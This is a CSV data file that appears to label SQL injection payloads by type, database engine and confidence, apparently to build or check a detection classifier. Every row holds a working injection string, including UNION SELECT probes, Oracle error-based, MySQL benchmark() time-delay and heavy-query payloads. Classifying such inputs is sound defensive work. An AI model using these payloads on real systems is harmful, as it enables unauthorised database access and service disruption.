payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abcf' like 'abcf",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,584,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'abcf' like 'abcf"
"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION in boolean mode for union-based,KEEP,,union_based,generic,585,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null,null#"
select ( case when ( 5740 = 7636 ) then 5740 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,586,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 5740 = 7636 ) then 5740 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
"-9286"" ) ) as mfxl where 9348 = 9348 union all select 9348#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,587,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9286"" ) ) as mfxl where 9348 = 9348 union all select 9348#"
"1%"" ) ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,588,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" ) ) union all select null,null,null,null,null,null#"
"1' ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,589,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) union all select null,null,null,null,null,null,null,null,null--"
"-8636"" ) ) ) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,590,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8636"" ) ) ) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--"
"-6940' ) union all select 3042,3042,3042,3042,3042#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,591,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6940' ) union all select 3042,3042,3042,3042,3042#"
"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,592,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
1 ) as qgsb where 7600 = 7600 and 2006 = 2006,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,593,boolean_blind,generic,Pattern match: 'and 2006 = 2006' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) as qgsb where 7600 = 7600 and 2006 = 2006
1' where 4795 = 4795 and 4595 = 4595#,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,594,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' where 4795 = 4795 and 4595 = 4595#
"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",boolean_blind,postgresql,0.8,CAST with char for blind,KEEP,,boolean_blind,postgresql,595,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1 ) as ghew where 6441 = 6441 union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,596,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) as ghew where 6441 = 6441 union all select null,null--"
"-2548"" ) ) ) or 5107 = 8049--",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,597,boolean_blind,generic,Pattern match: 'or 5107 = 8049' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2548"" ) ) ) or 5107 = 8049--"
"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,598,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) where 2834 = 2834 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --"
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,599,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#"
